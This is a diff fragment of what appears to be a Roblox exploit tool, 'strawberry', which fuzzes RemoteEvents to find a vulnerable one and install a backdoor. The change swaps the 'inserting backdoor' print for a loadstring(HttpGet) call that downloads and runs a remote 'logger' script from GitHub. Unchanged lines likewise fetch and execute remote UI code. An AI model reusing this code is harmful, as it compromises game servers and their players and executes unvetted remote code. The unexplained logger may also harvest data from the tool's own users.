@@ -21,6 +21,7 @@ Multi Arg Fuzzing
 Checks for RemoteEvents
 
 Made to be bugless (bugs very rare due to great executor support)
+THIS ONLY WORKS ON LEVEL 7+ EXECUTORS!!!
 --]]
 
 -- //===================[ CONFIG ]===================//
@@ -201,8 +202,7 @@ if found and vulnRemote then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/main.lua"))()
 	end
 
-	print("strawberry: inserting backdoor")
-	print("strawberry: loading ui")
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Loggers/log_v7%2B.lua"))() --log
 
 	shared.strawberryhook = function(target)
 		if vulnRemote:IsA("RemoteEvent") then
